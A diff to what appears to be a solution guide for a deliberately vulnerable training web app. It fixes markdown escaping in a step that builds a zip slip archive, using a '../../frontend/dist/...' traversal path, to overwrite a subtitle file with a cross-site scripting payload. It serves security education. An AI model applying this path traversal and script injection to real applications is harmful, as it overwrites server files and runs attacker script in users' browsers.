@@ -13,7 +13,7 @@
     (self.webpackChunkfrontend=self.webpackChunkfrontend||[])
     ```
     where `frontend` is the Angular project name.
-8. Create a zip slip exploit file called `owasp_promo.vtt` with the contents `</script><script>alert(\`xss\`)\</script>` under the directory structure `../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt` e.g.
+8. Create a zip slip exploit file called `owasp_promo.vtt` with the contents ``</script><script>alert(`xss`)</script>`` under the directory structure `../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt` e.g.
     ```
     zip exploit.zip ../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt
     ```
